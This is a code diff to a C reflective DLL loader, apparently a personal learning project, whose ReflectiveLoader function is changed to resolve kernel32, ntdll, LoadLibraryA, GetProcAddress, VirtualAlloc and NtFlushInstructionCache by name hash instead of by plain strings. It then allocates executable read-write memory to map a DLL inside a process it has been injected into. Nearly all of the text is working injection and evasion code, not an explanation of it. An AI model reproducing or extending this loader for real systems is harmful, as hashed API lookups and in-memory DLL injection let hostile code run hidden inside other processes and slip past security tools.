@@ -108,17 +108,60 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) // TODO: remove WINA
 	// access yet to the rest of the dll
 
 	// TODO: coring is happening cuz of these functions
-	HMODULE kernel32_module = GetModuleHandleManual(L"kernel32.dll");
-	HMODULE ntdll_module = GetModuleHandleManual(L"ntdll.dll");
+	HMODULE kernel32_module = NULL;
+	HMODULE ntdll_module = NULL;
+
+	DWORD status = RDI_SUCCESS;
+	status |= GetModuleHandleManual(KERNEL32DLL_HASH, &kernel32_module);
+	status |= GetModuleHandleManual(NTDLLDLL_HASH, &ntdll_module);
+	if ((status & 0xF0000000) == 0xE0000000)
+	{
+		return status;
+	}
+
+	/*
+	DWORD status = GetModuleHandleManual(L"KERNEL32.DLL", &kernel32_module);
+	if ((status & 0xF0000000) == 0xE0000000)
+	{
+		return RDI_ERR_NO_KERNEL32;
+	}
+	status = GetModuleHandleManual(L"ntdll.dll", &ntdll_module);
+	if ((status & 0xF0000000) == 0xE0000000)
+	{
+		return RDI_ERR_NO_NTDLL;
+	}
+
+	if ((status & 0xF0000000) == 0xE0000000)
+	{
+		return status;
+	}*/
+
+	if (kernel32_module == NULL || ntdll_module == NULL)
+		return RDI_ERR_RESOLVE_DEPS;
+
+	//return RDI_ERR_FAKE_SUCCESS;
+
+
 
 	//return RDI_ERR_MY_CUSTOM_ERROR;
-	LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)GetProcAddressManual(kernel32_module, "LoadLibraryA");
-
+	//LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)GetProcAddressManual(kernel32_module, "LoadLibraryA");
+	LOADLIBRARYA pLoadLibraryA = NULL;
 	// TODO: is this one needed or can i just use GetProcAddressManual? i think i can just use manual
-	GETPROCADDRESS pGetProcAddress = (GETPROCADDRESS)GetProcAddressManual(kernel32_module, "GetProcAddress");
-	VIRTUALALLOC pVirtualAlloc = (VIRTUALALLOC)GetProcAddressManual(kernel32_module, "VirtualAlloc");
-	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)GetProcAddressManual(kernel32_module, "NtFlushInstructionCache");
+	GETPROCADDRESS pGetProcAddress = NULL;
+	VIRTUALALLOC pVirtualAlloc = NULL;
+	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
+	status |= GetProcAddressManual(kernel32_module, LOADLIBRARYA_HASH, &pLoadLibraryA);
+	// TODO: is this one needed or can i just use GetProcAddressManual? i think i can just use manual
+	status |= GetProcAddressManual(kernel32_module, GETPROCADDRESS_HASH, &pGetProcAddress);
+	status |= GetProcAddressManual(kernel32_module, VIRTUALALLOC_HASH, &pVirtualAlloc);
+	status |= GetProcAddressManual(ntdll_module, NTFLUSHINSTRUCTIONCACHE_HASH, &pNtFlushInstructionCache);
+	if ((status & 0xF0000000) == 0xE0000000)
+	{
+		return status;
+	}
 
+	if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVirtualAlloc == NULL || pNtFlushInstructionCache == NULL)
+		return RDI_ERR_RESOLVE_DEPS;
 	////////////////////////////////////////////////
 
 
@@ -131,6 +174,7 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) // TODO: remove WINA
 	// the kernels base address and later this images newly loaded base address
 	// NOTE: this newly allocated memory also lives in the process we injected our reflective dll into
 	ULONG_PTR baseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)pNTHeader)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
 
 
 	// copy over dos header, dos stub, and pe header into baseAddress?
@@ -155,7 +199,6 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) // TODO: remove WINA
 	// we get the number of sections in the pe file, so we can write each section into memory 
 	WORD nSections = pNTHeader->FileHeader.NumberOfSections;
 
-
 	// uiValueA = the VA of the first section
 	// NOTE: OptionalHeader is the last field in PIMAGE_NT_HEADERS, so when we do 
 	// OptionalHeader + SizeOfOptionalHeader we get the address to the first section 
@@ -165,6 +208,9 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) // TODO: remove WINA
 	sizeOfHeaders = ( (ULONG_PTR)&(pNTHeader)->OptionalHeader + pNTHeader->FileHeader.SizeOfOptionalHeader);
 	//DWORD uiValueD;
 	DWORD sizeofRawData;
+
+	//return RDI_ERR_MY_CUSTOM_ERROR;
+
 	// NOTE: loop through all the sections in the pe file
 	while (nSections--)
 	{
